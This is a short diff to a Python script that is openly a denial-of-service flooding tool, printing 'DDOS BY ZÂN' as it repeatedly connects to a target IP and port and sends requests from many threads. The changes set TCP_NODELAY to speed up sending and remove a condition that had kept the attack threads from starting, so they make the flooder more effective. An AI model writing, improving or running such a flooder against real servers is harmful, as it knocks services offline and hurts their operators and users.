@@ -192,6 +192,7 @@ def join():
            s.send(str.encode(main_req))
            for i in range(pack):
                s.connect((str(ip),int(port)))
+               s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.send(str.encode(main_req))
                print("[!] DDOS BY ZÂN [!]")
         except:
@@ -199,6 +200,5 @@ def join():
              print('[+] server error')
 
 for x in range(th):
- if th == "anjg":
   th = threading.Thread(target=join)
   th.start()
